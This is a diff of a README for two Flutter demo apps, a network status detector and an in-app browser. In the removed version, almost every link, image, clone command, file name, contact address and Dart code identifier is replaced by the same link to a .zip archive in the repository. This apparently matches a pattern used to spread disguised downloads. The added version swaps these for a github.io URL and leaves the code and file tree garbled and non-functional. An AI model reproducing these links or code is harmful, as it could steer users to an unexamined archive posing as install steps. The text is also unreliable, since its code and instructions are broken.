@@ -3,7 +3,7 @@
   
 # Flutter Network Status Detector
 
-![Network Status Detector](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)
+![Network Status Detector](https://aayush014.github.io)
 
 
 ## Overview
@@ -22,7 +22,7 @@
 <p>
     <table align="center">
       <tr>
-        <td><img src="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip" alt="Image 2" width="180" height="auto"></td>
+        <td><img src="https://aayush014.github.io" alt="Image 2" width="180" height="auto"></td>
       </tr>
     </table>    
 </p>
@@ -31,7 +31,7 @@
 <p>
     <table align="center">
       <tr>
-        <td><img src="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip" alt="Image 2" width="180" height="auto"></td>
+        <td><img src="https://aayush014.github.io" alt="Image 2" width="180" height="auto"></td>
       </tr>
     </table>    
 </p>
@@ -39,7 +39,7 @@
 
 ### Video
 
-https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
+https://aayush014.github.io
 
 
 ## Getting Started
@@ -48,15 +48,15 @@ Follow these instructions to get a copy of the project up and running on your lo
 
 ### Prerequisites
 
-- [Flutter](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip) installed on your machine.
-- [Dart](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip) SDK.
+- [Flutter](https://aayush014.github.io) installed on your machine.
+- [Dart](https://aayush014.github.io) SDK.
 
 ### Installation Steps
 
 1. *Clone the repository:*
 
     ```bash
-    git clone https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
+    git clone https://aayush014.github.io
     ```
 
 2. *Install dependencies:*
@@ -79,9 +79,9 @@ Once the application is running, it will automatically detect your network statu
 StreamBuilder(
       stream: Connectivity().onConnectivityChanged,
       builder: (context, snapshot) {
-        if (https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip!.contains(https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)) {
+        if (https://aayush014.github.io!.contains(https://aayush014.github.io)) {
           return Center(child: Text('Mobile is connected to Mobile Data'));
-        } else if (https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip!.contains(https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)) {
+        } else if (https://aayush014.github.io!.contains(https://aayush014.github.io)) {
           return Center(child: Text('Mobile is connected to Wifi'));
         } else {
           return Center(
@@ -89,10 +89,10 @@ StreamBuilder(
               height: 350,
               width: 450,
               decoration: const BoxDecoration(
-                color: https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip,
+                color: https://aayush014.github.io,
                 image: DecorationImage(
-                  fit: https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip,
-                  image: AssetImage('https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip'),
+                  fit: https://aayush014.github.io,
+                  image: AssetImage('https://aayush014.github.io'),
                 ),
               ),
             ),
@@ -110,21 +110,21 @@ flutter-network-status-detector/
 ├── android/
 ├── ios/
 ├── lib/
-│   ├── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
+│   ├── https://aayush014.github.io
 │   ├── screens/
-│   │   ├── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
-│   │   ├── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
-│   │   └── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
+│   │   ├── https://aayush014.github.io
+│   │   ├── https://aayush014.github.io
+│   │   └── https://aayush014.github.io
 ├── test/
 ├── .gitignore
-├── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
-└── https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
+├── https://aayush014.github.io
+└── https://aayush014.github.io
 ```
 ## Key Files
-- *https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip*: The entry point for the application.
-- *https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip*: The main screen that handles navigation and initial network detection.
-- *https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip*: The screen displayed when the network is connected.
-- *https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip*: The screen displayed when the network is disconnected.
+- *https://aayush014.github.io*: The entry point for the application.
+- *https://aayush014.github.io*: The main screen that handles navigation and initial network detection.
+- *https://aayush014.github.io*: The screen displayed when the network is connected.
+- *https://aayush014.github.io*: The screen displayed when the network is disconnected.
 
 ### Contributing
 Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are greatly appreciated.
@@ -141,7 +141,7 @@ If you would like to contribute to this project, please follow these steps:
 Distributed under the MIT License. See `LICENSE` for more information.
 
 ### Contact
-My Mail - https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
+My Mail - https://aayush014.github.io
 </details>
 <details>
   <summary><h2>🔍In-App Browser Flutter App</h2></summary>
@@ -162,8 +162,8 @@ A single-page Flutter application that displays an in-app browser using the `flu
   <p>
     <table align="center">
   <tr>
-    <td><img src="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip" alt="Image 2" width="180" height="auto"></td>
-    <td><img src="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://aayush014.github.io" alt="Image 2" width="180" height="auto"></td>
+    <td><img src="https://aayush014.github.io" alt="Image 2" width="180" height="auto"></td>
   </tr>
     </table>    
   </p>
@@ -173,7 +173,7 @@ A single-page Flutter application that displays an in-app browser using the `flu
   <p>
     <table align="center">
   <tr>
-    <video src ="https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip"></video> </h1>
+    <video src ="https://aayush014.github.io"></video> </h1>
   </tr>
     </table>   
   </p>
@@ -183,15 +183,15 @@ A single-page Flutter application that displays an in-app browser using the `flu
 
 ### Prerequisites
 
-- Flutter SDK: [Install Flutter](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)
-- Dart: [Install Dart](https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip)
+- Flutter SDK: [Install Flutter](https://aayush014.github.io)
+- Dart: [Install Dart](https://aayush014.github.io)
 
 ### Installation
 
 1. *Clone the repository:*
 
     ```bash
-    git clone https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip
+    git clone https://aayush014.github.io
     ```
 
 2. *Install dependencies:*
@@ -208,7 +208,7 @@ A single-page Flutter application that displays an in-app browser using the `flu
 ## Code Example
 ```dart
 InAppWebView(
-        initialUrlRequest: URLRequest(url: https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip("https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip")),
+        initialUrlRequest: URLRequest(url: https://aayush014.github.io("https://aayush014.github.io")),
         onWebViewCreated: (controller) {
           webViewController = controller;
         },
@@ -232,7 +232,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Contact
 
-If you have any questions or suggestions, feel free to open an issue or contact me at [https://raw.githubusercontent.com/Aayush014/adv_flutter_ch3/master/android/flutter-adv-ch-spiked.zip].
+If you have any questions or suggestions, feel free to open an issue or contact me at [https://aayush014.github.io].
 
 ---
 
